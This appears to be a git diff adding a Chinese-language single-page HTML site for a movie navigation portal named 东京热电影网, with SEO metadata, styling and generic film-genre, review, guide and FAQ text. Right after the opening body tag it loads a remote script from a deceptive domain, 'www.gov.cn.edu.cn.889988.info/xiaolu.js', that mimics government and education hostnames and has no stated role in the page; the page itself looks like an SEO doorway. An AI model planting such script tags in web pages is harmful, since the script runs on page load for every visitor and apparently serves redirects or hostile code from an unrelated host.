@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>东京热电影网 - 电影分类导航、热播电影与影视资讯 | 东京热电影网</title>
+<meta name="description" content="东京热电影网采用杂志编辑式排版，提供电影分类导航、热播电影推荐、影视资讯、观影指南与常见问题，覆盖动作、喜剧、爱情、科幻、悬疑、动画等热门类型。官方网址：https://dongjingredianyingwang-wap.github.io">
+<meta name="keywords" content="东京热电影网, 电影, 电影导航, 热播电影, 影视资讯, 观影指南, 电影分类">
+<meta name="author" content="东京热电影网">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta name="theme-color" content="#0d0e12">
+<meta property="og:type" content="website">
+<meta property="og:title" content="东京热电影网 - 杂志式电影导航站">
+<meta property="og:description" content="东京热电影网：电影分类导航、热播推荐、影视资讯与观影指南，杂志编辑式排版。">
+<meta property="og:url" content="https://dongjingredianyingwang-wap.github.io">
+<meta property="og:site_name" content="东京热电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="东京热电影网">
+<meta name="twitter:description" content="东京热电影网：杂志式排版，电影分类导航与观影推荐。">
+<link rel="canonical" href="https://dongjingredianyingwang-wap.github.io">
+<style>
+:root{
+  --bg:#0d0e12;
+  --paper:#14161c;
+  --paper2:#1c1f28;
+  --ink:#f3f4f6;
+  --muted:#9aa1ad;
+  --line:#2a2e38;
+  --accent:#e7c66a;
+  --accent2:#d94e41;
+  --max:1200px;
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:"Georgia","Songti SC","STSong",-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",serif;
+  line-height:1.75;font-size:16px;overflow-x:hidden}
+img{max-width:100%;display:block}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+:focus-visible{outline:3px solid rgba(231,198,106,.6);outline-offset:2px;border-radius:4px}
+h1,h2,h3,h4{margin:0;line-height:1.25;font-weight:800;letter-spacing:.01em}
+p{margin:0 0 1em}
+ul,ol{margin:0;padding:0;list-style:none}
+.sans{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif}
+
+.wrap{max-width:var(--max);margin:0 auto;padding:0 24px}
+section{padding:90px 0}
+.rule{border:0;border-top:1px solid var(--line);margin:0}
+.masthead-note{font-size:11px;letter-spacing:.24em;text-transform:uppercase;color:var(--accent)}
+.kicker{font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);font-weight:700}
+
+/* ---------- Masthead ---------- */
+.masthead{border-bottom:4px double var(--line);padding:26px 0 18px;text-align:center;background:var(--bg)}
+.mast-top{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--muted);margin-bottom:18px}
+.brand-title{font-size:clamp(40px,9vw,86px);letter-spacing:.06em;line-height:1;margin:6px 0}
+.brand-title em{font-style:normal;color:var(--accent)}
+.brand-sub{font-size:13px;color:var(--muted);letter-spacing:.14em;margin-top:10px}
+.mast-nav{margin-top:20px;padding-top:14px;border-top:1px solid var(--line)}
+.mast-nav ul{display:flex;gap:2px;flex-wrap:wrap;justify-content:center}
+.mast-nav a{display:block;padding:8px 16px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC",sans-serif;font-size:14px;font-weight:700;color:var(--muted);letter-spacing:.04em}
+.mast-nav a:hover{color:var(--accent);text-decoration:none}
+
+/* ---------- Lead cover (DOM A: editorial cover) ---------- */
+.cover{display:grid;grid-template-columns:1.55fr 1fr;gap:0;border:1px solid var(--line);border-top:0}
+.cover-main{position:relative;min-height:520px;padding:46px;display:flex;flex-direction:column;justify-content:flex-end;overflow:hidden;
+  background:linear-gradient(155deg,#1a1c24 0%,#0d0e12 55%,#241a16 100%)}
+.cover-main:before{content:"";position:absolute;inset:0;background:
+  radial-gradient(540px 300px at 82% 12%,rgba(231,198,106,.20),transparent 62%),
+  radial-gradient(420px 260px at 8% 96%,rgba(217,78,65,.22),transparent 62%)}
+.cover-main:after{content:"";position:absolute;right:-40px;top:-40px;width:300px;height:300px;border-radius:50%;border:1px solid rgba(231,198,106,.28)}
+.cover-main > *{position:relative;z-index:1}
+.cover-main .dek{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:clamp(18px,2.4vw,24px);line-height:1.55;color:#d9dbe0;max-width:560px;margin:18px 0 30px}
+.cover-side{background:var(--paper);border-left:1px solid var(--line);padding:0}
+.side-list li{border-bottom:1px solid var(--line)}
+.side-list a{display:block;padding:22px 26px;transition:.18s}
+.side-list a:hover{background:var(--paper2);text-decoration:none}
+.side-list .num{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:11px;color:var(--accent2);font-weight:800;letter-spacing:.1em}
+.side-list h3{font-size:17px;margin:5px 0 5px}
+.side-list p{font-size:13px;color:var(--muted);margin:0}
+.cover-meta{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:12px;color:var(--muted);margin-top:26px;display:flex;gap:20px;flex-wrap:wrap}
+
+/* ---------- Genre ledger (DOM B: table-like ledger) ---------- */
+.ledger-head{display:grid;grid-template-columns:200px 1fr;gap:40px;align-items:end;margin-bottom:40px}
+.ledger-head h2{font-size:clamp(30px,4.6vw,46px)}
+.ledger{border-top:2px solid var(--line)}
+.ledger-row{display:grid;grid-template-columns:80px 1fr 1.4fr 130px;gap:26px;padding:24px 0;border-bottom:1px solid var(--line);align-items:center;transition:.18s}
+.ledger-row:hover{background:rgba(231,198,106,.035)}
+.ledger-row .no{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:13px;color:var(--accent2);font-weight:800}
+.ledger-row h3{font-size:21px}
+.ledger-row p{font-size:14px;color:var(--muted);margin:5px 0 0}
+.ledger-row .go{justify-self:end;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:13px;font-weight:800;color:var(--accent);border:1px solid var(--line);padding:9px 16px;border-radius:2px}
+.ledger-row:hover .go{background:var(--accent);color:#14161c;border-color:var(--accent)}
+
+/* ---------- Review columns (DOM C: multi-column text) ---------- */
+.reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:44px}
+.review{border-top:3px solid var(--accent);padding-top:22px}
+.review time{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:12px;color:var(--accent2);font-weight:700}
+.review h3{font-size:22px;margin:9px 0 11px}
+.review .excerpt{font-size:15.5px;color:#cfd2d8;column-count:1}
+.review .more{display:inline-block;margin-top:14px;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:13px;font-weight:800}
+
+/* ---------- Pull-quote guide (DOM D: pull quote + index) ---------- */
+.guide{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line)}
+.guide-quote{background:var(--accent);color:#14161c;padding:52px 46px;display:flex;flex-direction:column;justify-content:center}
+.guide-quote blockquote{margin:0;font-size:clamp(24px,3.4vw,38px);line-height:1.45;font-weight:800}
+.guide-quote cite{margin-top:26px;font-style:normal;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:13px;letter-spacing:.1em;text-transform:uppercase}
+.guide-list{padding:0;background:var(--paper)}
+.guide-list li{border-bottom:1px solid var(--line);padding:22px 30px;display:grid;grid-template-columns:44px 1fr;gap:16px;align-items:start}
+.guide-list li:last-child{border-bottom:0}
+.guide-list b{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:14px;color:var(--accent2);font-weight:800}
+.guide-list h3{font-size:17px}
+.guide-list p{font-size:14px;color:var(--muted);margin:5px 0 0}
+
+/* ---------- FAQ index (DOM E: definition list) ---------- */
+.faq-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.faq-item{border:1px solid var(--line);padding:28px;background:var(--paper);transition:.2s}
+.faq-item:hover{border-color:var(--accent)}
+.faq-item dt{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:11px;color:var(--accent2);font-weight:800;letter-spacing:.12em;margin-bottom:10px}
+.faq-item dd{margin:0}
+.faq-item h3{font-size:18px;margin-bottom:9px}
+.faq-item p{font-size:14px;color:var(--muted);margin:0}
+
+/* ---------- Footer ---------- */
+footer{border-top:4px double var(--line);padding:64px 0 30px;background:#0a0b0e}
+.foot{display:grid;grid-template-columns:1.6fr repeat(3,1fr);gap:40px}
+.foot h4{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:13px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:18px}
+.foot ul{display:grid;gap:10px}
+.foot a{color:var(--muted);font-size:14px}
+.foot a:hover{color:var(--accent)}
+.foot-brand .brand-title{font-size:32px;text-align:left;margin:0}
+.foot-brand p{color:var(--muted);margin-top:14px;font-size:14px}
+.bottom{margin-top:46px;padding-top:22px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:12px;color:var(--muted)}
+
+@media(max-width:1000px){
+  .cover{grid-template-columns:1fr}
+  .cover-side{border-left:0;border-top:1px solid var(--line)}
+  .ledger-row{grid-template-columns:56px 1fr;gap:16px}
+  .ledger-row p,.ledger-row .go{grid-column:2}
+  .ledger-row .go{justify-self:start}
+  .reviews{grid-template-columns:1fr 1fr}
+  .guide{grid-template-columns:1fr}
+  .faq-grid{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media(max-width:720px){
+  section{padding:60px 0}
+  .wrap{padding:0 18px}
+  .masthead{padding:22px 0 14px}
+  .mast-top{display:none}
+  .mast-nav ul{gap:0}
+  .mast-nav a{padding:9px 11px;font-size:13px}
+  .cover-main{min-height:auto;padding:34px 26px}
+  .ledger-head{grid-template-columns:1fr;gap:14px}
+  .ledger-row{grid-template-columns:1fr;gap:8px}
+  .ledger-row p,.ledger-row .go{grid-column:1}
+  .reviews{grid-template-columns:1fr;gap:34px}
+  .guide-quote{padding:38px 28px}
+  .guide-list li{padding:20px 24px}
+  .foot{grid-template-columns:1fr}
+  .foot-brand .brand-title{text-align:left}
+}
+@media print{.mast-nav,footer{display:none}section{padding:20px 0}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<a class="skip-link" href="#main" style="position:absolute;left:-9999px;">跳至主要内容</a>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="mast-top sans">
+      <span>东京热电影网 · 电影分类导航与观影参考</span>
+      <span>Vol. 06 · 独立编辑版</span>
+      <span>网址：dongjingredianyingwang-wap.github.io</span>
+    </div>
+    <div class="brand-title">东京热<em>电影网</em></div>
+    <div class="brand-sub sans">电影分类导航 · 热播推荐 · 影视资讯 · 观影指南 · 常见问题</div>
+    <nav class="mast-nav" aria-label="主导航">
+      <ul>
+        <li><a href="#cover">封面推荐</a></li>
+        <li><a href="#genres">电影分类</a></li>
+        <li><a href="#reviews">影视资讯</a></li>
+        <li><a href="#guide">观影指南</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+  <!-- DOM A: 杂志封面 + 侧栏导读清单 -->
+  <section id="cover" aria-labelledby="coverTitle" style="padding-top:50px">
+    <div class="wrap">
+      <div class="cover">
+        <article class="cover-main">
+          <span class="kicker">本期封面 · 电影导航</span>
+          <h2 id="coverTitle" class="brand-title" style="font-size:clamp(34px,5.6vw,56px);text-align:left;margin:0">把选片<br>变成一件<em>轻松的事</em></h2>
+          <p class="dek">东京热电影网用分类导航、热播推荐与影视资讯，帮助影迷在动作、喜剧、爱情、科幻、悬疑、动画之间快速定位值得观看的影片。</p>
+          <div class="cover-meta sans">
+            <span><a href="#genres">查看分类 ›</a></span>
+            <span><a href="#reviews">阅读资讯 ›</a></span>
+            <span><a href="#guide">选片方法 ›</a></span>
+          </div>
+        </article>
+        <aside class="cover-side" aria-label="今日导读">
+          <ul class="side-list">
+            <li><a href="#"><span class="num">01 / 焦点</span><h3>动作与科幻为何持续占据热播？</h3><p>节奏、视效与世界观是核心吸引力</p></a></li>
+            <li><a href="#"><span class="num">02 / 类型</span><h3>爱情与喜剧的周末选片逻辑</h3><p>时长、情绪与观影场景的取舍</p></a></li>
+            <li><a href="#"><span class="num">03 / 叙事</span><h3>悬疑片的反转与信息差</h3><p>理解常见结构，减少观影预期落差</p></a></li>
+            <li><a href="#"><span class="num">04 / 家庭</span><h3>家庭共同观影的三条原则</h3><p>题材、时长与适龄信息优先</p></a></li>
+            <li><a href="#"><span class="num">05 / 方法</span><h3>用分类加筛选缩短选片时间</h3><p>东京热电影网的实用浏览路径</p></a></li>
+          </ul>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- DOM B: 账目式（编号+标题+说明+动作）列表 -->
+  <section id="genres" aria-labelledby="genresTitle">
+    <div class="wrap">
+      <header class="ledger-head">
+        <div>
+          <p class="kicker">栏目二 · 电影分类</p>
+          <h2 id="genresTitle">六大热门类型目录</h2>
+        </div>
+        <p style="color:var(--muted)">东京热电影网按主流观影类型划分入口，每个类型可独立承载对应影片列表。当前内页链接均以 <code>#</code> 占位。</p>
+      </header>
+      <div class="ledger">
+        <article class="ledger-row"><span class="no">№ 01</span><div><h3>动作电影</h3><p>追逐、格斗与高能场面，强调节奏与执行。</p></div><div><p>常见标签：警匪、特工、武侠、灾难</p></div><a class="go" href="#">进入分类 ›</a></article>
+        <article class="ledger-row"><span class="no">№ 02</span><div><h3>喜剧电影</h3><p>以语言、情境或人物制造笑料，适合放松观影。</p></div><div><p>常见标签：都市、荒诞、家庭、黑色幽默</p></div><a class="go" href="#">进入分类 ›</a></article>
+        <article class="ledger-row"><span class="no">№ 03</span><div><h3>爱情电影</h3><p>聚焦人物关系与情感变化，强调共鸣。</p></div><div><p>常见标签：青春、都市、异地、重逢</p></div><a class="go" href="#">进入分类 ›</a></article>
+        <article class="ledger-row"><span class="no">№ 04</span><div><h3>科幻电影</h3><p>以设定与想象展开叙事，兼顾视效与思辨。</p></div><div><p>常见标签：太空、未来、人工智能、灾难</p></div><a class="go" href="#">进入分类 ›</a></article>
+        <article class="ledger-row"><span class="no">№ 05</span><div><h3>悬疑惊悚</h3><p>用信息差与反转制造紧张感与讨论空间。</p></div><div><p>常见标签：推理、犯罪、心理、密室</p></div><a class="go" href="#">进入分类 ›</a></article>
+        <article class="ledger-row"><span class="no">№ 06</span><div><h3>动画电影</h3><p>覆盖合家欢、奇幻与成人向的多元表达。</p></div><div><p>常见标签：冒险、治愈、神话、科幻</p></div><a class="go" href="#">进入分类 ›</a></article>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- DOM C: 三栏编辑评论式 -->
+  <section id="reviews" aria-labelledby="reviewsTitle" style="background:#11131a">
+    <div class="wrap">
+      <header class="ledger-head">
+        <div>
+          <p class="kicker">栏目三 · 影视资讯</p>
+          <h2 id="reviewsTitle">编辑部选片笔记</h2>
+        </div>
+        <p style="color:var(--muted)">东京热电影网汇总电影相关资讯与选片参考，帮助影迷建立自己的判断标准。</p>
+      </header>
+      <div class="reviews">
+        <article class="review"><time datetime="2026-05-18">2026.05.18</time><h3><a href="#">类型融合成为创作新方向</a></h3><p class="excerpt">科幻叠加悬疑、喜剧叠加爱情，多类型混搭正在扩大影片的受众边界，但也对叙事平衡提出更高要求。</p><a class="more" href="#">继续阅读 ›</a></article>
+        <article class="review"><time datetime="2026-05-09">2026.05.09</time><h3><a href="#">悬疑片的三个常见叙事钩子</a></h3><p class="excerpt">时间线错位、不可靠叙述者与关键物证，是制造反转最频繁使用的三种结构，了解它们能提升观影体验。</p><a class="more" href="#">继续阅读 ›</a></article>
+        <article class="review"><time datetime="2026-04-27">2026.04.27</time><h3><a href="#">家庭观影的筛选顺序</a></h3><p class="excerpt">先确认题材与适龄信息，再看时长与语言风格，最后参考口碑，这个顺序能减少选片后的调整成本。</p><a class="more" href="#">继续阅读 ›</a></article>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- DOM D: 大引文 + 编号索引 -->
+  <section id="guide" aria-labelledby="guideTitle">
+    <div class="wrap">
+      <header class="ledger-head" style="margin-bottom:34px">
+        <div>
+          <p class="kicker">栏目四 · 观影指南</p>
+          <h2 id="guideTitle">把选择交给方法</h2>
+        </div>
+        <p style="color:var(--muted)">东京热电影网建议用固定的浏览顺序来选片，比临时搜索更高效。</p>
+      </header>
+      <div class="guide">
+        <div class="guide-quote">
+          <blockquote>“选片不是找最热门的，而是找最适合此刻心情与场景的。”</blockquote>
+          <cite>— 东京热电影网 编辑部</cite>
+        </div>
+        <ol class="guide-list">
+          <li><b>STEP 1</b><div><h3>先定类型</h3><p>从电影分类栏目选一个方向，避免在无边界片库中反复滑动。</p></div></li>
+          <li><b>STEP 2</b><div><h3>再看场景</h3><p>独自看、约会看还是家庭看，直接决定影片的题材与尺度。</p></div></li>
+          <li><b>STEP 3</b><div><h3>后看时长</h3><p>可用时间决定是选 90 分钟短篇还是 130 分钟以上长篇。</p></div></li>
+          <li><b>STEP 4</b><div><h3>参考资讯</h3><p>阅读影视资讯中的解读，建立对影片定位的预期。</p></div></li>
+          <li><b>STEP 5</b><div><h3>跳转详情</h3><p>上线后将 <code>#</code> 占位链接替换为真实内容页地址。</p></div></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- DOM E: 定义列表式 FAQ -->
+  <section id="faq" aria-labelledby="faqTitle" style="background:#11131a">
+    <div class="wrap">
+      <header class="ledger-head">
+        <div>
+          <p class="kicker">栏目五 · 常见问题</p>
+          <h2 id="faqTitle">访客问询录</h2>
+        </div>
+        <p style="color:var(--muted)">这里整理使用电影导航站点时最常见的疑问，便于快速获取答案。</p>
+      </header>
+      <dl class="faq-grid">
+        <div class="faq-item"><dt>Q.01</dt><dd><h3>东京热电影网提供哪些内容？</h3><p>本站提供电影分类导航、热播电影展示、影视资讯与观影指南，覆盖多种主流电影类型。</p></dd></div>
+        <div class="faq-item"><dt>Q.02</dt><dd><h3>页面信息是否实时更新？</h3><p>当前影片、评分与资讯均为展示性示例，用于说明栏目结构与页面设计，正式上线后可替换为最新数据。</p></dd></div>
+        <div class="faq-item"><dt>Q.03</dt><dd><h3>手机端浏览体验如何？</h3><p>页面采用响应式布局，手机端自动调整栅格与字号，侧栏与表格结构会重排为适合触控阅读的形式。</p></dd></div>
+        <div class="faq-item"><dt>Q.04</dt><dd><h3>内页链接为什么是 #？</h3><p>当前为单页演示，内页导航链接以 <code>#</code> 占位；正式上线后替换为真实内容页地址即可。</p></dd></div>
+      </dl>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="foot-brand">
+        <div class="brand-title">东京热<em>电影网</em></div>
+        <p>东京热电影网：电影分类导航、热播电影推荐、影视资讯与观影指南。本站内页导航链接均以 <code>#</code> 占位。</p>
+      </div>
+      <div><h4>内容栏目</h4><ul>
+        <li><a href="#cover">封面推荐</a></li>
+        <li><a href="#genres">电影分类</a></li>
+        <li><a href="#reviews">影视资讯</a></li>
+        <li><a href="#guide">观影指南</a></li>
+      </ul></div>
+      <div><h4>电影类型</h4><ul>
+        <li><a href="#">动作电影</a></li>
+        <li><a href="#">喜剧电影</a></li>
+        <li><a href="#">科幻电影</a></li>
+        <li><a href="#">悬疑惊悚</a></li>
+      </ul></div>
+      <div><h4>官方网址</h4><ul>
+        <li><a href="https://dongjingredianyingwang-wap.github.io">dongjingredianyingwang-wap.github.io</a></li>
+        <li><a href="#faq">常见问题</a></li>
+        <li><a href="#">使用帮助</a></li>
+        <li><a href="#">关于我们</a></li>
+      </ul></div>
+    </div>
+    <div class="bottom">
+      <span>© <span id="year">2026</span> 东京热电影网 版权所有</span>
+      <span>网站名称：东京热电影网 · 网址：https://dongjingredianyingwang-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded',function(){
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+  document.querySelectorAll('a[href^="#"]').forEach(function(a){
+    a.addEventListener('click',function(e){
+      var id=this.getAttribute('href');
+      if(id.length>1){
+        var el=document.querySelector(id);
+        if(el){e.preventDefault();window.scrollTo({top:el.getBoundingClientRect().top+window.pageYOffset-60,behavior:'smooth'});}
+      }
+    });
+  });
+});
+</script>
+</body>
+</html>
